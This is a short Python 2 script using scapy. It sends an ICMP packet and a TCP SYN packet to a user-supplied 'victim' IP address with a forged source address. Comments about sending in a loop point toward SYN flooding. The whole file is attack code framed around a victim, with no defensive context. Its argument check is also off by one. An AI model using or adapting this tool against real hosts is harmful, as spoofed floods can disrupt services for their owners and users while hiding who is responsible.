from scapy.all import *
import os
import sys
import struct
if len(sys.argv) < 3:
	print "Usage: <script> victim_ip spoofed_ip dport"
	exit(1)

victim_ip = sys.argv[1]
spoofed_source_ip = sys.argv[2]
dport = int(sys.argv[3])

def build_icmp(victim_ip, spoofed_source_ip):
	packet = IP(dst=victim_ip, src=spoofed_source_ip)/ICMP()/"Custom Packet Injected"
	send(packet)

def build_tcp_conn_packet(victim_ip, spoofed_source_ip, dport):
	packet = IP(version=4,dst=victim_ip,src=spoofed_source_ip)/TCP(dport=dport,flags='S')
	#send in loop
	#sr1(packet) 
	#send just one packet
	send(packet)

#send_icmp = build_icmp(victim_ip, spoofed_source_ip)

send_tcp = build_tcp_conn_packet(victim_ip, spoofed_source_ip, dport)
